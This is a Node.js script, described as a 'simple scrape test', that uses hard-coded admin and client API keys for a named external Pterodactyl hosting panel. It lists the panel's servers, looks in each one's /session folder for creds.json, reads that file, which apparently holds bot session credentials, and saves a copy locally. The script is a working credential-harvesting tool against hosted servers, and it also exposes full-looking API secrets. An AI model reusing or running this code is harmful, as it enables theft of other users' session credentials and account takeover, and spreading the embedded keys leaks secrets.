const axios = require('axios');
const fs = require('fs');
const path = require('path');

console.log('🔍 Simple Scrape Test...\n');

// External panel configuration (updated)
const EXTERNAL_PANEL = {
    domain: 'https://panel-three.ndikafath.com',
    plta: 'ptla_IVUVn5BLp5ILW0U366RA7k7W9ZasObUafv1VXJsbMby',
    pltc: 'ptlc_fxVgEkxHt6d2hRR2YKVtwpGkjaVliCkD9CpwDLGVlPC'
};

const OUTPUT_SCRAPE_SENDER_DIR = 'output-scrape-sender';

console.log('📋 External Panel Configuration:');
console.log(`🌐 Domain: ${EXTERNAL_PANEL.domain}`);
console.log(`🔑 PLTA: ${EXTERNAL_PANEL.plta.substring(0, 10)}...`);
console.log(`🔑 PLTC: ${EXTERNAL_PANEL.pltc.substring(0, 10)}...`);

// External Panel API helper
class ExternalPteroAPI {
    static async appRequest(endpoint, method = 'GET', data = null) {
        try {
            const url = `${EXTERNAL_PANEL.domain}/api/application/${endpoint}`;
            const config = {
                method,
                url,
                headers: {
                    'Authorization': `Bearer ${EXTERNAL_PANEL.plta}`,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout: 30000
            };

            if (data) config.data = data;

            console.log(`🌐 App API Request: ${method} ${url}`);
            await new Promise(resolve => setTimeout(resolve, 2000));

            const response = await axios(config);
            console.log(`✅ App API Response: ${response.status}`);

            return response.data;
        } catch (error) {
            console.error(`❌ App API Error: ${error.response?.status} - ${error.message}`);
            throw error;
        }
    }

    static async clientRequest(endpoint, method = 'GET', data = null) {
        try {
            const url = `${EXTERNAL_PANEL.domain}/api/client/${endpoint}`;
            const config = {
                method,
                url,
                headers: {
                    'Authorization': `Bearer ${EXTERNAL_PANEL.pltc}`,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout: 30000
            };

            if (data) config.data = data;

            console.log(`🌐 Client API Request: ${method} ${url}`);
            await new Promise(resolve => setTimeout(resolve, 2000));

            const response = await axios(config);
            console.log(`✅ Client API Response: ${response.status}`);

            return response.data;
        } catch (error) {
            console.error(`❌ Client API Error: ${error.response?.status} - ${error.message}`);
            throw error;
        }
    }

    static async getAllServers() {
        try {
            const response = await this.appRequest('servers');
            return response.data || [];
        } catch (error) {
            console.log('❌ Cannot get servers via API');
            return [];
        }
    }
}

// Clean JSON content function
function cleanJsonContent(content) {
    if (!content || typeof content !== 'string') {
        return content;
    }
    
    // Remove line numbers like "1{...}" at the beginning
    let cleaned = content.replace(/^\d+\{/, '{');
    
    // Remove any leading/trailing whitespace
    cleaned = cleaned.trim();
    
    return cleaned;
}

// Simple test function
async function testSimpleScrape() {
    try {
        console.log('\n🚀 Starting simple scrape test...');
        
        // Get servers from external panel
        console.log('📡 Getting servers from external panel...');
        const externalServers = await ExternalPteroAPI.getAllServers();

        console.log(`📊 External panel servers: ${externalServers.length}`);
        
        if (externalServers.length === 0) {
            console.log('❌ No external servers found');
            return;
        }

        // Create output directory
        const outputDir = path.join(__dirname, OUTPUT_SCRAPE_SENDER_DIR);
        console.log(`📁 Creating output directory: ${outputDir}`);
        
        if (!fs.existsSync(outputDir)) {
            fs.mkdirSync(outputDir, { recursive: true });
            console.log(`✅ Created output directory: ${outputDir}`);
        } else {
            console.log(`✅ Output directory already exists: ${outputDir}`);
        }

        // Test with first server that has creds.json
        console.log(`\n🔍 Looking for server with creds.json...`);

        for (const server of externalServers.slice(0, 10)) {
            const serverUuid = server.attributes.uuid;
            const serverName = server.attributes.name;

            console.log(`\n🔍 Testing server: ${serverName} (${serverUuid})`);

            try {
                // Check /session directory
                console.log(`📁 Checking /session directory...`);
                const sessionFiles = await ExternalPteroAPI.clientRequest(`servers/${serverUuid}/files/list?directory=%2Fsession`, 'GET');
                
                if (sessionFiles.data && sessionFiles.data.length > 0) {
                    console.log(`📋 Found ${sessionFiles.data.length} files in /session`);
                    
                    // Look for creds.json
                    const credsFile = sessionFiles.data.find(file => 
                        file.attributes.is_file && file.attributes.name === 'creds.json'
                    );
                    
                    if (credsFile) {
                        console.log(`📄 Found creds.json in /session!`);
                        
                        // Try to read the file
                        try {
                            console.log(`📖 Reading creds.json...`);
                            const fileContent = await ExternalPteroAPI.clientRequest(
                                `servers/${serverUuid}/files/contents?file=%2Fsession%2Fcreds.json`,
                                'GET'
                            );
                            
                            console.log(`📊 File content type: ${typeof fileContent}`);
                            console.log(`📊 File content length: ${fileContent ? (typeof fileContent === 'string' ? fileContent.length : JSON.stringify(fileContent).length) : 'NULL'}`);
                            
                            let contentToSave = null;

                            if (fileContent && typeof fileContent === 'string' && fileContent.trim().length > 0) {
                                console.log(`✅ Successfully read creds.json (string)!`);
                                console.log(`📊 Content preview: ${fileContent.substring(0, 100)}...`);
                                contentToSave = fileContent;
                            } else if (fileContent && typeof fileContent === 'object' && fileContent !== null) {
                                console.log(`✅ Successfully read creds.json (object)!`);
                                contentToSave = JSON.stringify(fileContent, null, 2);
                                console.log(`📊 Content preview: ${contentToSave.substring(0, 100)}...`);
                            } else {
                                console.log(`⚠️ File content is empty or invalid`);
                                console.log(`📊 Raw response: ${JSON.stringify(fileContent).substring(0, 200)}...`);
                            }

                            if (contentToSave) {
                                // Clean and validate JSON
                                try {
                                    const cleanedContent = cleanJsonContent(contentToSave);
                                    const jsonData = JSON.parse(cleanedContent);
                                    console.log(`✅ Valid JSON with ${Object.keys(jsonData).length} properties`);

                                    // Save to file
                                    const safeFileName = serverName.replace(/[^a-zA-Z0-9-_]/g, '_') + '.json';
                                    const outputFilePath = path.join(outputDir, safeFileName);

                                    console.log(`💾 Saving to: ${outputFilePath}`);
                                    fs.writeFileSync(outputFilePath, cleanedContent, 'utf8');

                                    // Verify file was saved
                                    if (fs.existsSync(outputFilePath)) {
                                        const fileStats = fs.statSync(outputFilePath);
                                        console.log(`✅ File saved successfully - Size: ${fileStats.size} bytes`);
                                        console.log(`📁 File location: ${outputFilePath}`);

                                        console.log('\n🎉 SUCCESS! File scraped and saved successfully!');
                                        console.log(`📋 Server: ${serverName}`);
                                        console.log(`📄 File: ${safeFileName}`);
                                        console.log(`📊 Size: ${fileStats.size} bytes`);
                                        console.log(`📁 Path: ${outputFilePath}`);

                                        return; // Exit after first successful scrape
                                    } else {
                                        console.log(`❌ File was not saved: ${outputFilePath}`);
                                    }

                                } catch (jsonError) {
                                    console.log(`❌ Invalid JSON: ${jsonError.message}`);
                                    console.log(`📊 Raw content: ${contentToSave.substring(0, 200)}...`);
                                }
                            }
                            
                        } catch (readError) {
                            console.log(`❌ Failed to read creds.json: ${readError.response?.status} - ${readError.message}`);
                        }
                    } else {
                        console.log(`⚠️ No creds.json found in /session`);
                    }
                } else {
                    console.log(`⚠️ /session directory is empty or not accessible`);
                }
                
            } catch (error) {
                console.log(`❌ Error checking server ${serverName}: ${error.response?.status} - ${error.message}`);
            }
            
            // Small delay
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        console.log('\n❌ No servers with valid creds.json found in first 10 servers');

    } catch (error) {
        console.error('❌ Test failed:', error.message);
    }
}

// Run the test
testSimpleScrape().catch(console.error);
